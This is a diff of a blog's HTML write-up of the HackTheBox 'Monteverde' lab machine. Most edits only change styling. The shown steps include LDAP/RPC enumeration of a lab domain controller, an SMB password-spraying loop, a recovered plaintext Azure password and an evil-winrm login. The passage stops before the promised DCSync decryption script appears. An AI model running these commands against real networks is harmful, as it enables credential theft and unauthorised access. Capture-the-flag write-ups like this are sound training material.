@@ -2,7 +2,7 @@
 <html lang="en">
   <head>
     <title>
-        Hackthebox - Montevarde Writeup - A personal cybersecurity blog
+        Hackthebox - Montevarde Writeup - fmash16&#39;s blog
       </title>
         <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
@@ -21,10 +21,10 @@
     
     <meta name="description" content="A medium difficulty windows box exploited through ldap and azure." />
     <meta name="generator" content="Hugo 0.71.0 with theme pure" />
-    <title>Hackthebox - Montevarde Writeup - A personal cybersecurity blog</title>
+    <title>Hackthebox - Montevarde Writeup - fmash16&#39;s blog</title>
     
     
-    <link rel="stylesheet" href="/css/style.min.d25af0bab4d33793898dbd0b3c2137b1b04a01c67b4d3321370361298f0ae3de.css">
+    <link rel="stylesheet" href="/css/style.min.bef22498336108fd63d73af3a80f7d93e90f4ab8174c15d0ce0fe149dcf0312b.css">
     
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css" async>
     <meta property="og:title" content="Hackthebox - Montevarde Writeup" />
@@ -40,7 +40,7 @@
 <meta itemprop="description" content="A medium difficulty windows box exploited through ldap and azure.">
 <meta itemprop="datePublished" content="2020-05-30T00:00:00&#43;00:00" />
 <meta itemprop="dateModified" content="2020-05-30T00:00:00&#43;00:00" />
-<meta itemprop="wordCount" content="1021">
+<meta itemprop="wordCount" content="1018">
 <meta itemprop="image" content="/img/htb_montevarde/card.png">
 <meta itemprop="image" content="/">
 
@@ -427,7 +427,7 @@
       <p><img src="/img/htb_montevarde/card.png" alt=""></p>
 <h2 id="nmap-scan">Nmap Scan</h2>
 <hr>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>nmap -sC -sV -sS -oN nmap.out 10.10.10.172
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>nmap -sC -sV -sS -oN nmap.out 10.10.10.172
 </code></pre></div><p>Open ports:</p>
 <blockquote>
 <p>PORT     STATE SERVICE       VERSION<br>
@@ -467,77 +467,73 @@ Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows</p>
 Machine Name : MONTEVARDE</p>
 </blockquote>
 <p>Got some users and groups:</p>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span>Group <span style="color:#48b685">&#39;Trading&#39;</span> <span style="color:#5bc4bf">(</span>RID: 2610<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\d</span>galanos
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>Group <span style="color:#48b685">&#39;Domain Users&#39;</span> <span style="color:#5bc4bf">(</span>RID: 513<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\A</span>dministrator
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>Group <span style="color:#48b685">&#39;Domain Users&#39;</span> <span style="color:#5bc4bf">(</span>RID: 513<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\k</span>rbtgt
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>Group <span style="color:#48b685">&#39;Domain Users&#39;</span> <span style="color:#5bc4bf">(</span>RID: 513<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\A</span>AD_987d7f2f57d2
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>Group <span style="color:#48b685">&#39;Domain Users&#39;</span> <span style="color:#5bc4bf">(</span>RID: 513<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\m</span>hope
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>Group <span style="color:#48b685">&#39;Domain Users&#39;</span> <span style="color:#5bc4bf">(</span>RID: 513<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\S</span>ABatchJobs
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>Group <span style="color:#48b685">&#39;Domain Users&#39;</span> <span style="color:#5bc4bf">(</span>RID: 513<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\s</span>vc-ata
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>Group <span style="color:#48b685">&#39;Domain Users&#39;</span> <span style="color:#5bc4bf">(</span>RID: 513<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\s</span>vc-bexec
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>Group <span style="color:#48b685">&#39;Domain Users&#39;</span> <span style="color:#5bc4bf">(</span>RID: 513<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\s</span>vc-netapp
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>Group <span style="color:#48b685">&#39;Domain Users&#39;</span> <span style="color:#5bc4bf">(</span>RID: 513<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\d</span>galanos
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>Group <span style="color:#48b685">&#39;Domain Users&#39;</span> <span style="color:#5bc4bf">(</span>RID: 513<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\r</span>oleary
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>Group <span style="color:#48b685">&#39;Domain Users&#39;</span> <span style="color:#5bc4bf">(</span>RID: 513<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\s</span>morgan
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span>Group <span style="color:#48b685">&#39;Domain Guests&#39;</span> <span style="color:#5bc4bf">(</span>RID: 514<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\G</span>uest
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span>Group <span style="color:#48b685">&#39;HelpDesk&#39;</span> <span style="color:#5bc4bf">(</span>RID: 2611<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\r</span>oleary
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span>Group <span style="color:#48b685">&#39;Group Policy Creator Owners&#39;</span> <span style="color:#5bc4bf">(</span>RID: 520<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\A</span>dministrator
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span>Group <span style="color:#48b685">&#39;Azure Admins&#39;</span> <span style="color:#5bc4bf">(</span>RID: 2601<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\A</span>dministrator
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span>Group <span style="color:#48b685">&#39;Azure Admins&#39;</span> <span style="color:#5bc4bf">(</span>RID: 2601<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\A</span>AD_987d7f2f57d2
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span>Group <span style="color:#48b685">&#39;Azure Admins&#39;</span> <span style="color:#5bc4bf">(</span>RID: 2601<span style="color:#5bc4bf">)</span> has member: MEGABANK<span style="color:#f99b15">\m</span>hope
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 1</span>Group <span style="color:#ed9d13">&#39;Trading&#39;</span> (RID: 2610) has member: MEGABANK<span style="color:#ed9d13">\d</span>galanos
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 2</span>Group <span style="color:#ed9d13">&#39;Domain Users&#39;</span> (RID: 513) has member: MEGABANK<span style="color:#ed9d13">\A</span>dministrator
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 3</span>Group <span style="color:#ed9d13">&#39;Domain Users&#39;</span> (RID: 513) has member: MEGABANK<span style="color:#ed9d13">\k</span>rbtgt
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 4</span>Group <span style="color:#ed9d13">&#39;Domain Users&#39;</span> (RID: 513) has member: MEGABANK<span style="color:#ed9d13">\A</span>AD_987d7f2f57d2
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 5</span>Group <span style="color:#ed9d13">&#39;Domain Users&#39;</span> (RID: 513) has member: MEGABANK<span style="color:#ed9d13">\m</span>hope
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 6</span>Group <span style="color:#ed9d13">&#39;Domain Users&#39;</span> (RID: 513) has member: MEGABANK<span style="color:#ed9d13">\S</span>ABatchJobs
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 7</span>Group <span style="color:#ed9d13">&#39;Domain Users&#39;</span> (RID: 513) has member: MEGABANK<span style="color:#ed9d13">\s</span>vc-ata
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 8</span>Group <span style="color:#ed9d13">&#39;Domain Users&#39;</span> (RID: 513) has member: MEGABANK<span style="color:#ed9d13">\s</span>vc-bexec
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 9</span>Group <span style="color:#ed9d13">&#39;Domain Users&#39;</span> (RID: 513) has member: MEGABANK<span style="color:#ed9d13">\s</span>vc-netapp
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">10</span>Group <span style="color:#ed9d13">&#39;Domain Users&#39;</span> (RID: 513) has member: MEGABANK<span style="color:#ed9d13">\d</span>galanos
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">11</span>Group <span style="color:#ed9d13">&#39;Domain Users&#39;</span> (RID: 513) has member: MEGABANK<span style="color:#ed9d13">\r</span>oleary
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">12</span>Group <span style="color:#ed9d13">&#39;Domain Users&#39;</span> (RID: 513) has member: MEGABANK<span style="color:#ed9d13">\s</span>morgan
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">13</span>Group <span style="color:#ed9d13">&#39;Domain Guests&#39;</span> (RID: 514) has member: MEGABANK<span style="color:#ed9d13">\G</span>uest
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">14</span>Group <span style="color:#ed9d13">&#39;HelpDesk&#39;</span> (RID: 2611) has member: MEGABANK<span style="color:#ed9d13">\r</span>oleary
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">15</span>Group <span style="color:#ed9d13">&#39;Group Policy Creator Owners&#39;</span> (RID: 520) has member: MEGABANK<span style="color:#ed9d13">\A</span>dministrator
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">16</span>Group <span style="color:#ed9d13">&#39;Azure Admins&#39;</span> (RID: 2601) has member: MEGABANK<span style="color:#ed9d13">\A</span>dministrator
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">17</span>Group <span style="color:#ed9d13">&#39;Azure Admins&#39;</span> (RID: 2601) has member: MEGABANK<span style="color:#ed9d13">\A</span>AD_987d7f2f57d2
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">18</span>Group <span style="color:#ed9d13">&#39;Azure Admins&#39;</span> (RID: 2601) has member: MEGABANK<span style="color:#ed9d13">\m</span>hope
 </code></pre></div><p>What is interesting is the group azure admins and its member mhope</p>
 <h2 id="ldapsearch">ldapsearch</h2>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>ldapsearch -x -h 10.10.10.172 -s base namingcontext
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span>ldapsearch -x -h 10.10.10.172 -s base
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>ldapsearch -x -h 10.10.10.172 -s base namingcontext
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">2</span>ldapsearch -x -h 10.10.10.172 -s base
 </code></pre></div><p><img src="/img/htb_montevarde/1.png" alt=""></p>
 <p>We find:</p>
 <blockquote>
 <p>namingContexts: DC=MEGABANK,DC=LOCAL</p>
 </blockquote>
 <p>Now we can enumerate using ldapsearch</p>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>ldapsearch -x -b <span style="color:#48b685">&#34;dc=megabank,dc=local&#34;</span> -h 10.10.10.172 -s sub
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>ldapsearch -x -b <span style="color:#ed9d13">&#34;dc=megabank,dc=local&#34;</span> -h 10.10.10.172 -s sub
 </code></pre></div><h2 id="rpcclient">rpcclient</h2>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>rpcclient -U <span style="color:#48b685">&#39;&#39;</span> 10.10.10.172
-</code></pre></div><div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>rpcclient $&gt; enumdomusers
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>rpcclient -U <span style="color:#ed9d13">&#39;&#39;</span> 10.10.10.172
+</code></pre></div><div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>rpcclient $&gt; enumdomusers
 </code></pre></div><p><img src="/img/htb_montevarde/2.png" alt=""></p>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>rpcclient $&gt; enumdomgroups
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>rpcclient $&gt; enumdomgroups
 </code></pre></div><p><img src="/img/htb_montevarde/3.png" alt=""></p>
-<p>``bash
-rpclient $&gt; querygroupmem 0xa29</p>
-<pre><code>
-![](/img/htb_montevarde/4.png)
-
-```bash
-rpcclient $&gt; queryuser 0x641
-</code></pre><p><img src="/img/htb_montevarde/5.png" alt=""></p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>rpclient $&gt; querygroupmem 0xa29
+</code></pre></div><p><img src="/img/htb_montevarde/4.png" alt=""></p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>rpcclient $&gt; queryuser 0x641
+</code></pre></div><p><img src="/img/htb_montevarde/5.png" alt=""></p>
 <h1 id="privilege-escalation---user">Privilege Escalation - User</h1>
 <h2 id="smbclient-bruteforce">smbclient bruteforce</h2>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span style="color:#815ba4">while</span> read USER; <span style="color:#815ba4">do</span> echo <span style="color:#ef6155">$USER</span> <span style="color:#5bc4bf">&amp;&amp;</span> smbclient -L <span style="color:#f99b15">\\\\</span>10.10.10.172 -U <span style="color:#ef6155">$USER</span>%<span style="color:#ef6155">$USER</span>; <span style="color:#815ba4">done</span> &lt; users.txt
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span><span style="color:#6ab825;font-weight:bold">while</span> <span style="color:#24909d">read</span> USER; <span style="color:#6ab825;font-weight:bold">do</span> <span style="color:#24909d">echo</span> <span style="color:#40ffff">$USER</span> &amp;&amp; smbclient -L <span style="color:#ed9d13">\\\\</span>10.10.10.172 -U <span style="color:#40ffff">$USER</span>%<span style="color:#40ffff">$USER</span>; <span style="color:#6ab825;font-weight:bold">done</span> &lt; users.txt
 </code></pre></div><p><img src="/img/htb_montevarde/6.png" alt=""></p>
 <p>We see an intersting share users$. We mount the share using smbclient and have
 a look.</p>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>smbclient <span style="color:#f99b15">\\\\</span>10.10.10.172<span style="color:#f99b15">\\</span>users$ -U SABatchJobs%SABatchJobs
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>smbclient <span style="color:#ed9d13">\\\\</span>10.10.10.172<span style="color:#ed9d13">\\</span>users$ -U SABatchJobs%SABatchJobs
 </code></pre></div><p><img src="/img/htb_montevarde/7.png" alt=""></p>
 <p>In the direcotory of user mhope, we find an interesting file <strong>azure.xml</strong>, we
 download it to our local machine usign <strong>get</strong></p>
 <p><img src="/img/htb_montevarde/8.png" alt=""></p>
 <h2 id="azurexml">azure.xml</h2>
 <p>Having a look at the file, we get</p>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#5bc4bf">&lt;Objs</span> <span style="color:#06b6ef">Version=</span><span style="color:#48b685">&#34;1.1.0.1&#34;</span> <span style="color:#06b6ef">xmlns=</span><span style="color:#48b685">&#34;http://schemas.microsoft.com/powershell/2004/04&#34;</span><span style="color:#5bc4bf">&gt;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>  <span style="color:#5bc4bf">&lt;Obj</span> <span style="color:#06b6ef">RefId=</span><span style="color:#48b685">&#34;0&#34;</span><span style="color:#5bc4bf">&gt;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>    <span style="color:#5bc4bf">&lt;TN</span> <span style="color:#06b6ef">RefId=</span><span style="color:#48b685">&#34;0&#34;</span><span style="color:#5bc4bf">&gt;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>      <span style="color:#5bc4bf">&lt;T&gt;</span>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential<span style="color:#5bc4bf">&lt;/T&gt;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>      <span style="color:#5bc4bf">&lt;T&gt;</span>System.Object<span style="color:#5bc4bf">&lt;/T&gt;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>    <span style="color:#5bc4bf">&lt;/TN&gt;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>    <span style="color:#5bc4bf">&lt;ToString&gt;</span>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential<span style="color:#5bc4bf">&lt;/ToString&gt;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>    <span style="color:#5bc4bf">&lt;Props&gt;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>      <span style="color:#5bc4bf">&lt;DT</span> <span style="color:#06b6ef">N=</span><span style="color:#48b685">&#34;StartDate&#34;</span><span style="color:#5bc4bf">&gt;</span>2020-01-03T05:35:00.7562298-08:00<span style="color:#5bc4bf">&lt;/DT&gt;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>      <span style="color:#5bc4bf">&lt;DT</span> <span style="color:#06b6ef">N=</span><span style="color:#48b685">&#34;EndDate&#34;</span><span style="color:#5bc4bf">&gt;</span>2054-01-03T05:35:00.7562298-08:00<span style="color:#5bc4bf">&lt;/DT&gt;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>      <span style="color:#5bc4bf">&lt;G</span> <span style="color:#06b6ef">N=</span><span style="color:#48b685">&#34;KeyId&#34;</span><span style="color:#5bc4bf">&gt;</span>00000000-0000-0000-0000-000000000000<span style="color:#5bc4bf">&lt;/G&gt;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>      <span style="color:#5bc4bf">&lt;S</span> <span style="color:#06b6ef">N=</span><span style="color:#48b685">&#34;Password&#34;</span><span style="color:#5bc4bf">&gt;</span>4n0therD4y@n0th3r$<span style="color:#5bc4bf">&lt;/S&gt;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span>    <span style="color:#5bc4bf">&lt;/Props&gt;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span>  <span style="color:#5bc4bf">&lt;/Obj&gt;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span style="color:#5bc4bf">&lt;/Objs&gt;</span>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 1</span><span style="color:#6ab825;font-weight:bold">&lt;Objs</span> <span style="color:#bbb">Version=</span><span style="color:#ed9d13">&#34;1.1.0.1&#34;</span> <span style="color:#bbb">xmlns=</span><span style="color:#ed9d13">&#34;http://schemas.microsoft.com/powershell/2004/04&#34;</span><span style="color:#6ab825;font-weight:bold">&gt;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 2</span>  <span style="color:#6ab825;font-weight:bold">&lt;Obj</span> <span style="color:#bbb">RefId=</span><span style="color:#ed9d13">&#34;0&#34;</span><span style="color:#6ab825;font-weight:bold">&gt;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 3</span>    <span style="color:#6ab825;font-weight:bold">&lt;TN</span> <span style="color:#bbb">RefId=</span><span style="color:#ed9d13">&#34;0&#34;</span><span style="color:#6ab825;font-weight:bold">&gt;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 4</span>      <span style="color:#6ab825;font-weight:bold">&lt;T&gt;</span>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential<span style="color:#6ab825;font-weight:bold">&lt;/T&gt;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 5</span>      <span style="color:#6ab825;font-weight:bold">&lt;T&gt;</span>System.Object<span style="color:#6ab825;font-weight:bold">&lt;/T&gt;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 6</span>    <span style="color:#6ab825;font-weight:bold">&lt;/TN&gt;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 7</span>    <span style="color:#6ab825;font-weight:bold">&lt;ToString&gt;</span>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential<span style="color:#6ab825;font-weight:bold">&lt;/ToString&gt;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 8</span>    <span style="color:#6ab825;font-weight:bold">&lt;Props&gt;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 9</span>      <span style="color:#6ab825;font-weight:bold">&lt;DT</span> <span style="color:#bbb">N=</span><span style="color:#ed9d13">&#34;StartDate&#34;</span><span style="color:#6ab825;font-weight:bold">&gt;</span>2020-01-03T05:35:00.7562298-08:00<span style="color:#6ab825;font-weight:bold">&lt;/DT&gt;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">10</span>      <span style="color:#6ab825;font-weight:bold">&lt;DT</span> <span style="color:#bbb">N=</span><span style="color:#ed9d13">&#34;EndDate&#34;</span><span style="color:#6ab825;font-weight:bold">&gt;</span>2054-01-03T05:35:00.7562298-08:00<span style="color:#6ab825;font-weight:bold">&lt;/DT&gt;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">11</span>      <span style="color:#6ab825;font-weight:bold">&lt;G</span> <span style="color:#bbb">N=</span><span style="color:#ed9d13">&#34;KeyId&#34;</span><span style="color:#6ab825;font-weight:bold">&gt;</span>00000000-0000-0000-0000-000000000000<span style="color:#6ab825;font-weight:bold">&lt;/G&gt;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">12</span>      <span style="color:#6ab825;font-weight:bold">&lt;S</span> <span style="color:#bbb">N=</span><span style="color:#ed9d13">&#34;Password&#34;</span><span style="color:#6ab825;font-weight:bold">&gt;</span>4n0therD4y@n0th3r$<span style="color:#6ab825;font-weight:bold">&lt;/S&gt;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">13</span>    <span style="color:#6ab825;font-weight:bold">&lt;/Props&gt;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">14</span>  <span style="color:#6ab825;font-weight:bold">&lt;/Obj&gt;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">15</span><span style="color:#6ab825;font-weight:bold">&lt;/Objs&gt;</span>
 </code></pre></div><p>Here we get a password. Since the file was in the directory of user mhope, it
 should be the password for mhope</p>
 <p>Creds found:</p>
@@ -546,7 +542,7 @@ should be the password for mhope</p>
 Password: 4n0therD4y@n0th3r$</p>
 </blockquote>
 <h2 id="evil-winrm-shell">Evil-winrm shell</h2>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>evil-winrm -i 10.10.10.172 -u mhope -p 4n0therD4y@n0th3r$
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>evil-winrm -i 10.10.10.172 -u mhope -p 4n0therD4y@n0th3r$
 </code></pre></div><p>And we get a shell. We also get our required user.txt file.</p>
 <p><img src="/img/htb_montevarde/9.png" alt=""></p>
 <h1 id="privilege-escalation---administrator">Privilege Escalation - Administrator</h1>
@@ -562,48 +558,48 @@ a <strong>DCsunc</strong> attack. Read more on this type of attacks <a href="htt
 <p>So here, the vulnerability allows us to access the DC database containing creds
 and decrypt it (performing a <strong>DCsync</strong>). We get the powershell script (here.)[https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545#file-azuread_decrypt_msol-ps1]
 We change the script according to our needs as follows</p>
